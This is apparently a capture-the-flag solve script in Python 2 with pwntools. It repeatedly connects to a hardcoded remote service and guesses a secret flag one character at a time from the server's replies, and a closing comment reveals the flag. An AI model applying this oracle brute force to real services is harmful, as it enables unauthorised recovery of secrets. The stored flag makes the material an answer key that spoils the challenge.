
from pwn import *
import string
# context(log_level ="debug")
printable = string.uppercase+string.lowercase+string.octdigits+string.punctuation
def getflag(flag):
	sleep(0.1)
	# p = process('./cg_leak')
	p = remote('106.75.8.230',13349)
	p.recvuntil('OUR NAME:')
	p.sendline('admin')
	p.recvuntil("'s your name again?\n")
	p.sendline('admin')
	p.recvuntil('FLAG: ')
	p.sendline(flag)
	data = p.recvuntil('\n')
	p.close()
	if data == 'Try submit then!\n':
		return True
	else:
		return False
flag = ''
i = 0
while i<40:
	for x in printable:
	 if getflag(flag+x):
	 	flag+=x
	 	print flag
	i+=1
print flag

#FLAG{wh4t3v3r_1s_0k}